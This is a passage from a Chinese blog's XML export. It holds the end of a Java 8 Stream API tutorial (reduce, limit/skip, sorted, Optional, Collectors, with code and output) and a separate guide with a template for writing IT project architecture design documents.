<p>另外一点需要注意，forEach 是 terminal 操作，因此它执行后，Stream 的元素就被“消费”掉了，你无法对一个 Stream 进行两次 terminal 运算。下面的代码是错误的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream.forEach(element -&gt; doOneThing(element));</span><br><span class="line">stream.forEach(element -&gt; doAnotherThing(element));</span><br></pre></td></tr></table></figure>

<p>相反，具有相似功能的 intermediate 操作 peek 可以达到上述目的。如下是出现在该 api javadoc 上的一个示例。</p>
<p>清单 13. peek 对每个元素执行操作并返回一个新的 Stream</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Stream.of(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, &quot;four&quot;)</span><br><span class="line"> .filter(e -&gt; e.length() &gt; 3)</span><br><span class="line"> .peek(e -&gt; System.out.println(&quot;Filtered value: &quot; + e))</span><br><span class="line"> .map(String::toUpperCase)</span><br><span class="line"> .peek(e -&gt; System.out.println(&quot;Mapped value: &quot; + e))</span><br><span class="line"> .collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p>forEach 不能修改自己包含的本地变量值，也不能用 break&#x2F;return 之类的关键字提前结束循环。</p>
<h3 id="findFirst"><a href="#findFirst" class="headerlink" title="findFirst"></a>findFirst</h3><p>这是一个 termimal 兼 short-circuiting 操作，它总是返回 Stream 的第一个元素，或者空。</p>
<p>这里比较重点的是它的返回值类型：Optional。这也是一个模仿 Scala 语言中的概念，作为一个容器，它可能含有某值，或者不包含。使用它的目的是尽可能避免 NullPointerException。</p>
<p>清单 14. Optional 的两个用例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String strA = &quot; abcd &quot;, strB = null;</span><br><span class="line">print(strA);</span><br><span class="line">print(&quot;&quot;);</span><br><span class="line">print(strB);</span><br><span class="line">getLength(strA);</span><br><span class="line">getLength(&quot;&quot;);</span><br><span class="line">getLength(strB);</span><br><span class="line">public static void print(String text) &#123;</span><br><span class="line">	 // Java 8</span><br><span class="line">	 Optional.ofNullable(text).ifPresent(System.out::println);</span><br><span class="line">	 // Pre-Java 8</span><br><span class="line">	 if (text != null) &#123;</span><br><span class="line">		 System.out.println(text);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line">public static int getLength(String text) &#123;</span><br><span class="line">	 // Java 8</span><br><span class="line">	return Optional.ofNullable(text).map(String::length).orElse(-1);</span><br><span class="line">	// Pre-Java 8</span><br><span class="line">	// return if (text != null) ? text.length() : -1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在更复杂的 if (xx !&#x3D; null) 的情况中，使用 Optional 代码的可读性更好，而且它提供的是编译时检查，能极大的降低 NPE 这种 Runtime Exception 对程序的影响，或者迫使程序员更早的在编码阶段处理空值问题，而不是留到运行时再发现和调试。</p>
<p>Stream 中的 findAny、max&#x2F;min、reduce 等方法等返回 Optional 值。还有例如 IntStream.average() 返回 OptionalDouble 等等。</p>
<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>这个方法的主要作用是把 Stream 元素组合起来。它提供一个起始值（种子），然后依照运算规则（BinaryOperator），和前面 Stream 的第一个、第二个、第 n 个元素组合。从这个意义上说，字符串拼接、数值的 sum、min、max、average 都是特殊的 reduce。例如 Stream 的 sum 就相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Integer sum = integers.reduce(0, (a, b) -&gt; a+b); 或</span><br><span class="line">Integer sum = integers.reduce(0, Integer::sum);</span><br></pre></td></tr></table></figure>

<p>也有没有起始值的情况，这时会把 Stream 的前面两个元素组合起来，返回的是 Optional。</p>
<p>清单 15. reduce 的用例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 字符串连接，concat = &quot;ABCD&quot;</span><br><span class="line">String concat = Stream.of(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;).reduce(&quot;&quot;, String::concat); </span><br><span class="line">// 求最小值，minValue = -3.0</span><br><span class="line">double minValue = Stream.of(-1.5, 1.0, -3.0, -2.0).reduce(Double.MAX_VALUE, Double::min); </span><br><span class="line">// 求和，sumValue = 10, 有起始值</span><br><span class="line">int sumValue = Stream.of(1, 2, 3, 4).reduce(0, Integer::sum);</span><br><span class="line">// 求和，sumValue = 10, 无起始值</span><br><span class="line">sumValue = Stream.of(1, 2, 3, 4).reduce(Integer::sum).get();</span><br><span class="line">// 过滤，字符串连接，concat = &quot;ace&quot;</span><br><span class="line">concat = Stream.of(&quot;a&quot;, &quot;B&quot;, &quot;c&quot;, &quot;D&quot;, &quot;e&quot;, &quot;F&quot;).</span><br><span class="line"> filter(x -&gt; x.compareTo(&quot;Z&quot;) &gt; 0).</span><br><span class="line"> reduce(&quot;&quot;, String::concat);</span><br></pre></td></tr></table></figure>

<p>上面代码例如第一个示例的 reduce()，第一个参数（空白字符）即为起始值，第二个参数（String::concat）为 BinaryOperator。这类有起始值的 reduce() 都返回具体的对象。而对于第四个示例没有起始值的 reduce()，由于可能没有足够的元素，返回的是 Optional，请留意这个区别。</p>
<h3 id="limit-x2F-skip"><a href="#limit-x2F-skip" class="headerlink" title="limit&#x2F;skip"></a>limit&#x2F;skip</h3><p>limit 返回 Stream 的前面 n 个元素；skip 则是扔掉前 n 个元素（它是由一个叫 subStream 的方法改名而来）。</p>
<p>清单 16. limit 和 skip 对运行次数的影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void testLimitAndSkip() &#123;</span><br><span class="line"> List&lt;Person&gt; persons = new ArrayList();</span><br><span class="line"> for (int i = 1; i &lt;= 10000; i++) &#123;</span><br><span class="line"> Person person = new Person(i, &quot;name&quot; + i);</span><br><span class="line"> persons.add(person);</span><br><span class="line"> &#125;</span><br><span class="line">List&lt;String&gt; personList2 = persons.stream().</span><br><span class="line">map(Person::getName).limit(10).skip(3).collect(Collectors.toList());</span><br><span class="line"> System.out.println(personList2);</span><br><span class="line">&#125;</span><br><span class="line">private class Person &#123;</span><br><span class="line"> public int no;</span><br><span class="line"> private String name;</span><br><span class="line"> public Person (int no, String name) &#123;</span><br><span class="line"> this.no = no;</span><br><span class="line"> this.name = name;</span><br><span class="line"> &#125;</span><br><span class="line"> public String getName() &#123;</span><br><span class="line"> System.out.println(name);</span><br><span class="line"> return name;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name1</span><br><span class="line">name2</span><br><span class="line">name3</span><br><span class="line">name4</span><br><span class="line">name5</span><br><span class="line">name6</span><br><span class="line">name7</span><br><span class="line">name8</span><br><span class="line">name9</span><br><span class="line">name10</span><br><span class="line">[name4, name5, name6, name7, name8, name9, name10]</span><br></pre></td></tr></table></figure>

<p>这是一个有 10，000 个元素的 Stream，但在 short-circuiting 操作 limit 和 skip 的作用下，管道中 map 操作指定的 getName() 方法的执行次数为 limit 所限定的 10 次，而最终返回结果在跳过前 3 个元素后只有后面 7 个返回。</p>
<p>有一种情况是 limit&#x2F;skip 无法达到 short-circuiting 目的的，就是把它们放在 Stream 的排序操作后，原因跟 sorted 这个 intermediate 操作有关：此时系统并不知道 Stream 排序后的次序如何，所以 sorted 中的操作看上去就像完全没有被 limit 或者 skip 一样。</p>
<p>清单 17. limit 和 skip 对 sorted 后的运行次数无影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;Person&gt; persons = new ArrayList();</span><br><span class="line"> for (int i = 1; i &lt;= 5; i++) &#123;</span><br><span class="line"> Person person = new Person(i, &quot;name&quot; + i);</span><br><span class="line"> persons.add(person);</span><br><span class="line"> &#125;</span><br><span class="line">List&lt;Person&gt; personList2 = persons.stream().sorted((p1, p2) -&gt; </span><br><span class="line">p1.getName().compareTo(p2.getName())).limit(2).collect(Collectors.toList());</span><br><span class="line">System.out.println(personList2);</span><br></pre></td></tr></table></figure>

<p>上面的示例对清单 13 做了微调，首先对 5 个元素的 Stream 排序，然后进行 limit 操作。输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name2</span><br><span class="line">name1</span><br><span class="line">name3</span><br><span class="line">name2</span><br><span class="line">name4</span><br><span class="line">name3</span><br><span class="line">name5</span><br><span class="line">name4</span><br><span class="line">[stream.StreamDW$Person@816f27d, stream.StreamDW$Person@87aac27]</span><br></pre></td></tr></table></figure>

<p>即虽然最后的返回元素数量是 2，但整个管道中的 sorted 表达式执行次数没有像前面例子相应减少。</p>
<p>最后有一点需要注意的是，对一个 parallel 的 Steam 管道来说，如果其元素是有序的，那么 limit 操作的成本会比较大，因为它的返回对象必须是前 n 个也有一样次序的元素。取而代之的策略是取消元素间的次序，或者不要用 parallel Stream。</p>
<h3 id="sorted"><a href="#sorted" class="headerlink" title="sorted"></a>sorted</h3><p>对 Stream 的排序通过 sorted 进行，它比数组的排序更强之处在于你可以首先对 Stream 进行各类 map、filter、limit、skip 甚至 distinct 来减少元素数量后，再排序，这能帮助程序明显缩短执行时间。我们对清单 14 进行优化：</p>
<p>清单 18. 优化：排序前进行 limit 和 skip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;Person&gt; persons = new ArrayList();</span><br><span class="line"> for (int i = 1; i &lt;= 5; i++) &#123;</span><br><span class="line"> Person person = new Person(i, &quot;name&quot; + i);</span><br><span class="line"> persons.add(person);</span><br><span class="line"> &#125;</span><br><span class="line">List&lt;Person&gt; personList2 = persons.stream().limit(2).sorted((p1, p2) -&gt; p1.getName().compareTo(p2.getName())).collect(Collectors.toList());</span><br><span class="line">System.out.println(personList2);</span><br></pre></td></tr></table></figure>

<p>结果会简单很多：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name2</span><br><span class="line">name1</span><br><span class="line">[stream.StreamDW$Person@6ce253f1, stream.StreamDW$Person@53d8d10a]</span><br></pre></td></tr></table></figure>

<p>当然，这种优化是有 business logic 上的局限性的：即不要求排序后再取值。</p>
<h3 id="min-x2F-max-x2F-distinct"><a href="#min-x2F-max-x2F-distinct" class="headerlink" title="min&#x2F;max&#x2F;distinct"></a>min&#x2F;max&#x2F;distinct</h3><p>min 和 max 的功能也可以通过对 Stream 元素先排序，再 findFirst 来实现，但前者的性能会更好，为 O(n)，而 sorted 的成本是 O(n log n)。同时它们作为特殊的 reduce 方法被独立出来也是因为求最大最小值是很常见的操作。</p>
<p>清单 19. 找出最长一行的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BufferedReader br = new BufferedReader(new FileReader(&quot;c:\\SUService.log&quot;));</span><br><span class="line">int longest = br.lines().</span><br><span class="line"> mapToInt(String::length).</span><br><span class="line"> max().</span><br><span class="line"> getAsInt();</span><br><span class="line">br.close();</span><br><span class="line">System.out.println(longest);</span><br></pre></td></tr></table></figure>

<p>下面的例子则使用 distinct 来找出不重复的单词。</p>
<p>清单 20. 找出全文的单词，转小写，并排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; words = br.lines().</span><br><span class="line"> flatMap(line -&gt; Stream.of(line.split(&quot; &quot;))).</span><br><span class="line"> filter(word -&gt; word.length() &gt; 0).</span><br><span class="line"> map(String::toLowerCase).</span><br><span class="line"> distinct().</span><br><span class="line"> sorted().</span><br><span class="line"> collect(Collectors.toList());</span><br><span class="line">br.close();</span><br><span class="line">System.out.println(words);</span><br></pre></td></tr></table></figure>

<h3 id="Match"><a href="#Match" class="headerlink" title="Match"></a>Match</h3><p>Stream 有三个 match 方法，从语义上说：</p>
<ul>
<li>allMatch：Stream 中全部元素符合传入的 predicate，返回 true</li>
<li>anyMatch：Stream 中只要有一个元素符合传入的 predicate，返回 true</li>
<li>noneMatch：Stream 中没有一个元素符合传入的 predicate，返回 true</li>
</ul>
<p>它们都不是要遍历全部元素才能返回结果。例如 allMatch 只要一个元素不满足条件，就 skip 剩下的所有元素，返回 false。对清单 13 中的 Person 类稍做修改，加入一个 age 属性和 getAge 方法。</p>
<p>清单 21. 使用 Match</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;Person&gt; persons = new ArrayList();</span><br><span class="line">persons.add(new Person(1, &quot;name&quot; + 1, 10));</span><br><span class="line">persons.add(new Person(2, &quot;name&quot; + 2, 21));</span><br><span class="line">persons.add(new Person(3, &quot;name&quot; + 3, 34));</span><br><span class="line">persons.add(new Person(4, &quot;name&quot; + 4, 6));</span><br><span class="line">persons.add(new Person(5, &quot;name&quot; + 5, 55));</span><br><span class="line">boolean isAllAdult = persons.stream().</span><br><span class="line"> allMatch(p -&gt; p.getAge() &gt; 18);</span><br><span class="line">System.out.println(&quot;All are adult? &quot; + isAllAdult);</span><br><span class="line">boolean isThereAnyChild = persons.stream().</span><br><span class="line"> anyMatch(p -&gt; p.getAge() &lt; 12);</span><br><span class="line">System.out.println(&quot;Any child? &quot; + isThereAnyChild);</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">All are adult? false</span><br><span class="line">Any child? true</span><br></pre></td></tr></table></figure>

<h2 id="进阶：自己生成流"><a href="#进阶：自己生成流" class="headerlink" title="进阶：自己生成流"></a>进阶：自己生成流</h2><h3 id="Stream-generate"><a href="#Stream-generate" class="headerlink" title="Stream.generate"></a>Stream.generate</h3><p>通过实现 Supplier 接口，你可以自己来控制流的生成。这种情形通常用于随机数、常量的 Stream，或者需要前后元素间维持着某种状态信息的 Stream。把 Supplier 实例传递给 Stream.generate() 生成的 Stream，默认是串行（相对 parallel 而言）但无序的（相对 ordered 而言）。由于它是无限的，在管道中，必须利用 limit 之类的操作限制 Stream 大小。</p>
<p>清单 22. 生成 10 个随机整数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Random seed = new Random();</span><br><span class="line">Supplier&lt;Integer&gt; random = seed::nextInt;</span><br><span class="line">Stream.generate(random).limit(10).forEach(System.out::println);</span><br><span class="line">//Another way</span><br><span class="line">IntStream.generate(() -&gt; (int) (System.nanoTime() % 100)).</span><br><span class="line">limit(10).forEach(System.out::println);</span><br></pre></td></tr></table></figure>

<p>Stream.generate() 还接受自己实现的 Supplier。例如在构造海量测试数据的时候，用某种自动的规则给每一个变量赋值；或者依据公式计算 Stream 的每个元素值。这些都是维持状态信息的情形。</p>
<p>清单 23. 自实现 Supplier</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Stream.generate(new PersonSupplier()).</span><br><span class="line">limit(10).</span><br><span class="line">forEach(p -&gt; System.out.println(p.getName() + &quot;, &quot; + p.getAge()));</span><br><span class="line">private class PersonSupplier implements Supplier&lt;Person&gt; &#123;</span><br><span class="line"> private int index = 0;</span><br><span class="line"> private Random random = new Random();</span><br><span class="line"> @Override</span><br><span class="line"> public Person get() &#123;</span><br><span class="line"> return new Person(index++, &quot;StormTestUser&quot; + index, random.nextInt(100));</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StormTestUser1, 9</span><br><span class="line">StormTestUser2, 12</span><br><span class="line">StormTestUser3, 88</span><br><span class="line">StormTestUser4, 51</span><br><span class="line">StormTestUser5, 22</span><br><span class="line">StormTestUser6, 28</span><br><span class="line">StormTestUser7, 81</span><br><span class="line">StormTestUser8, 51</span><br><span class="line">StormTestUser9, 4</span><br><span class="line">StormTestUser10, 76</span><br></pre></td></tr></table></figure>

<h3 id="Stream-iterate"><a href="#Stream-iterate" class="headerlink" title="Stream.iterate"></a>Stream.iterate</h3><p>iterate 跟 reduce 操作很像，接受一个种子值，和一个 UnaryOperator（例如 f）。然后种子值成为 Stream 的第一个元素，f(seed) 为第二个，f(f(seed)) 第三个，以此类推。</p>
<p>清单 24. 生成一个等差数列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Stream.iterate(0, n -&gt; n + 3).limit(10). forEach(x -&gt; System.out.print(x + &quot; &quot;));</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 3 6 9 12 15 18 21 24 27</span><br></pre></td></tr></table></figure>

<p>与 Stream.generate 相仿，在 iterate 时候管道必须有 limit 这样的操作来限制 Stream 大小。</p>
<h2 id="进阶：用-Collectors-来进行-reduction-操作"><a href="#进阶：用-Collectors-来进行-reduction-操作" class="headerlink" title="进阶：用 Collectors 来进行 reduction 操作"></a>进阶：用 Collectors 来进行 reduction 操作</h2><p>java.util.stream.Collectors 类的主要作用就是辅助进行各类有用的 reduction 操作，例如转变输出为 Collection，把 Stream 元素进行归组。</p>
<h3 id="groupingBy-x2F-partitioningBy"><a href="#groupingBy-x2F-partitioningBy" class="headerlink" title="groupingBy&#x2F;partitioningBy"></a>groupingBy&#x2F;partitioningBy</h3><p>清单 25. 按照年龄归组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Integer, List&lt;Person&gt;&gt; personGroups = Stream.generate(new PersonSupplier()).</span><br><span class="line"> limit(100).</span><br><span class="line"> collect(Collectors.groupingBy(Person::getAge));</span><br><span class="line">Iterator it = personGroups.entrySet().iterator();</span><br><span class="line">while (it.hasNext()) &#123;</span><br><span class="line"> Map.Entry&lt;Integer, List&lt;Person&gt;&gt; persons = (Map.Entry) it.next();</span><br><span class="line"> System.out.println(&quot;Age &quot; + persons.getKey() + &quot; = &quot; + persons.getValue().size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的 code，首先生成 100 人的信息，然后按照年龄归组，相同年龄的人放到同一个 list 中，可以看到如下的输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Age 0 = 2</span><br><span class="line">Age 1 = 2</span><br><span class="line">Age 5 = 2</span><br><span class="line">Age 8 = 1</span><br><span class="line">Age 9 = 1</span><br><span class="line">Age 11 = 2</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>清单 26. 按照未成年人和成年人归组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Boolean, List&lt;Person&gt;&gt; children = Stream.generate(new PersonSupplier()).</span><br><span class="line"> limit(100).</span><br><span class="line"> collect(Collectors.partitioningBy(p -&gt; p.getAge() &lt; 18));</span><br><span class="line">System.out.println(&quot;Children number: &quot; + children.get(true).size());</span><br><span class="line">System.out.println(&quot;Adult number: &quot; + children.get(false).size());</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Children number: 23</span><br><span class="line">Adult number: 77</span><br></pre></td></tr></table></figure>

<p>在使用条件“年龄小于 18”进行分组后可以看到，不到 18 岁的未成年人是一组，成年人是另外一组。partitioningBy 其实是一种特殊的 groupingBy，它依照条件测试的是否两种结果来构造返回的数据结构，get(true) 和 get(false) 能即为全部的元素对象。</p>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>总之，Stream 的特性可以归纳为：</p>
<p><strong>不是数据结构</strong></p>
<p>它没有内部存储，它只是用操作管道从 source（数据结构、数组、generator function、IO channel）抓取数据。</p>
<p>它也绝不修改自己所封装的底层数据结构的数据。例如 Stream 的 filter 操作会产生一个不包含被过滤元素的新 Stream，而不是从 source 删除那些元素。</p>
<p>所有 Stream 的操作必须以 lambda 表达式为参数</p>
<p><strong>不支持索引访问</strong></p>
<p>你可以请求第一个元素，但无法请求第二个，第三个，或最后一个。不过请参阅下一项。<br>很容易生成数组或者 List</p>
<p><strong>惰性化</strong></p>
<p>很多 Stream 操作是向后延迟的，一直到它弄清楚了最后需要多少数据才会开始。<br>Intermediate 操作永远是惰性化的。</p>
<p><strong>并行能力</strong></p>
<p>当一个 Stream 是并行化的，就不需要再写多线程代码，所有对它的操作会自动并行进行的。<br>可以是无限的</p>
<p>集合有固定大小，Stream 则不必。limit(n) 和 findFirst() 这类的 short-circuiting 操作可以对无限的 Stream 进行运算并很快完成。</p>
<p>转自：<a href="https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/">https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>IT项目架构设计文档编写方法和要点</title>
    <url>/blog/arch/pn-cst-pmp-arch/</url>
    <content><![CDATA[<h2 id="视频讲解"><a href="#视频讲解" class="headerlink" title="视频讲解"></a><a href="https://www.bilibili.com/video/BV1524y1C7dM">视频讲解</a></h2><p>项目流程中技术评审环节，需要做架构设计评审，本文档主要讲解架构设计文档编写原则，约束架构设计文档的格式、内容，以达到提高技术评审质量，提升项目开发质量的目的。</p>
<h1 id="编写流程"><a href="#编写流程" class="headerlink" title="编写流程"></a>编写流程</h1><p>首先技术负责人，做为一个项目的技术决策人员，需要了解业务需求，按如下步骤组织编写技术评审文档：</p>
<ol>
<li>了解业务需求和现有系统架构，按架构原则整理项目架构相关文档</li>
<li>完成架构相关考虑后，按需求对项目拆分功能模块，并对每个模块标注必须设计点</li>
<li>按人员情况将功能模块分配到人，组织编写所有功能模块的详细设计</li>
<li>验收每个模块的详细设计是否达标</li>
<li>所有模块详细设计完成后组织技术评审</li>
</ol>
<h1 id="编写原则"><a href="#编写原则" class="headerlink" title="编写原则"></a>编写原则</h1><p>架构设计文档主要分为两个层面，架构层面和设计层面。</p>
<h2 id="架构层面原则"><a href="#架构层面原则" class="headerlink" title="架构层面原则"></a>架构层面原则</h2><ol>
<li>项目架构描述：如果是迭代项目，现有项目架构情况需要描述清楚，可以传送到固定的项目架构文档，不用每次都写</li>
<li>路由规划：相关功能的路由调用链路，域名、SLB、nginx、gateway、微服务链路</li>
<li>安全规划：内外网功能划分，鉴权、反黑产等</li>
<li>性能&amp;可用性规划：QPS、限流、集群配制、资源规格等</li>
<li>扩展性规划：根据后续项目的迭代计划，要预留哪些扩展考虑哪些问题</li>
<li>上线规划：新老版本兼容问题、灰度计划、试点计划等</li>
<li>事故恢复：如何保障异常出现后恢复系统和数据，要求第一层兜底</li>
<li>门店服务要按非可靠网络下大型分布式系统架构，考虑弱网模式、断网模式、断电重启、磁盘损坏等场景下数据和服务的可靠性。</li>
</ol>
<p>以上为架构层面主要考虑的内容，各项目技术负责人可以根据实际情况补充，如不需要相关设计标不需要相关设计即可，但必须标注以示思考过相关层面问题。</p>
<h2 id="设计层面原则"><a href="#设计层面原则" class="headerlink" title="设计层面原则"></a>设计层面原则</h2><ol>
<li>从需求角度用技术语言简要说明需求和实现的大体逻辑。</li>
<li>从系统角度说明要修改哪些系统的哪些功能。</li>
<li>从接口角度说明要新增&#x2F;修改哪些微服务的哪些接口。</li>
<li>从数据角度说明涉及数据的来源、数据量大小、数据一致性等方面情况。</li>
<li>从事故角度说明异常出现后如何恢复系统和数据，要求第一层兜底</li>
</ol>
<h3 id="接口注意事项"><a href="#接口注意事项" class="headerlink" title="接口注意事项"></a>接口注意事项</h3><p>接口分为外部接口和内部接口。</p>
<p>外部接口是提供给网关和C端使用的接口，修改出入参必须在文档中说明。</p>
<p>外部接口的新增和修改会影响前端上线发布，要考虑兼容性和是否影响上线。</p>
<p>内部接口，因为可以同时上线，没有第三方调用，需要考虑历史数据的兼容性。</p>
<h3 id="数据注意事项"><a href="#数据注意事项" class="headerlink" title="数据注意事项"></a>数据注意事项</h3><p>数据来源：数据库、es、redis、第三方接口</p>
<p>涉及数据查询必须提供生产数据量和未来数据量变化的评估，主要判断有没有性能问题。</p>
<p>新增或修改数据来源必须有详细说明：</p>
<ol>
<li>数据库要有字段来源说明或SQL语句</li>
<li>ES要有索引和字段说明</li>
<li>redis要有KEY和值格式说明</li>
<li>第三方接口要有出入参数变化说明</li>
</ol>
<h2 id="文档编写"><a href="#文档编写" class="headerlink" title="文档编写"></a>文档编写</h2><p>对于核心的模块或接口，需要以文字、时序图、流程图的方式做出详细设计。</p>
<p>文字主要说明算法步骤。</p>
<p>时序图主要说明一次调用的中间过程和涉及系统。</p>
<p>流程图主要说明业务的流程变化。</p>
<h1 id="技术文档模板"><a href="#技术文档模板" class="headerlink" title="技术文档模板"></a>技术文档模板</h1><h2 id="系统架构部分"><a href="#系统架构部分" class="headerlink" title="系统架构部分"></a>系统架构部分</h2><p><strong>项目架构</strong></p>
<p>如无修改可以连接现有文档</p>
<p><strong>路由架构</strong></p>
<p>如无修改可以连接现有文档</p>
<p><strong>安全架构</strong></p>
<p>如无修改可以连接现有文档</p>
<p><strong>性能和可用性</strong></p>
<p>说明项目需求在计算、存储、可用性上的问题和解决方案，如无写无问题。</p>
<p><strong>扩展性</strong></p>
<p>说明项目需求在计算、存储、可用性上的问题和解决方案，如无写无问题。</p>
<p><strong>上线规划</strong></p>
<p>新老版本兼容问题、灰度计划、试点计划等</p>
<p><strong>事故恢复</strong></p>
<p>架构层面的事故恢复机制，如无修改可以连接现有文档</p>
<h2 id="功能详细设计"><a href="#功能详细设计" class="headerlink" title="功能详细设计"></a>功能详细设计</h2><h3 id="功能模块1（张三）"><a href="#功能模块1（张三）" class="headerlink" title="功能模块1（张三）"></a>功能模块1（张三）</h3><p><strong>需求1</strong></p>
<p>技术负责人标注：需要特殊说明的功能点和要求</p>
<p>需求简述：</p>
<p>功能开发逻辑：</p>
<ol>
<li>功能层面：以文字、时序图、流程图等方式说明功能的流程步骤</li>
<li>系统层面：在哪几个系统上新增或修改的接口清单</li>
<li>数据层面：存取了哪些数据，数据怎么流转的，数据的关系，数据量大小，是否有性能问题</li>
<li>外部交互：是否是外部接口或三方接口，迭代扩展如何保障</li>
</ol>
<p><strong>需求2</strong></p>
<p>技术负责人标注：需要特殊说明的功能点和要求</p>
<p>需求简述：</p>
<p>功能开发逻辑：</p>
<ol>
<li>功能层面：以文字、时序图、流程图等方式说明功能的流程步骤</li>
<li>系统层面：在哪几个系统上新增或修改的接口清单</li>
<li>数据层面：存取了哪些数据，数据怎么流转的，数据的关系，数据量大小，是否有性能问题</li>
<li>外部交互：是否是外部接口或三方接口，迭代扩展如何保障</li>
</ol>
<h3 id="功能模块2（李四）"><a href="#功能模块2（李四）" class="headerlink" title="功能模块2（李四）"></a>功能模块2（李四）</h3><p><strong>需求1</strong></p>
<p>技术负责人标注：需要特殊说明的功能点和要求</p>
<p>需求简述：</p>
<p>功能开发逻辑：</p>
<ol>
<li>功能层面：以文字、时序图、流程图等方式说明功能的流程步骤</li>
<li>系统层面：在哪几个系统上新增或修改的接口清单</li>
<li>数据层面：存取了哪些数据，数据怎么流转的，数据的关系，数据量大小，是否有性能问题</li>
<li>外部交互：是否是外部接口或三方接口，迭代扩展如何保障</li>
</ol>
<p><strong>需求2</strong></p>
<p>技术负责人标注：需要特殊说明的功能点和要求</p>
<p>需求简述：</p>
<p>功能开发逻辑：</p>
<ol>
<li>功能层面：以文字、时序图、流程图等方式说明功能的流程步骤</li>
<li>系统层面：在哪几个系统上新增或修改的接口清单</li>
<li>数据层面：存取了哪些数据，数据怎么流转的，数据的关系，数据量大小，是否有性能问题</li>
<li>外部交互：是否是外部接口或三方接口，迭代扩展如何保障</li>
</ol>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>项目管理</tag>
      </tags>
  </entry>
</search>
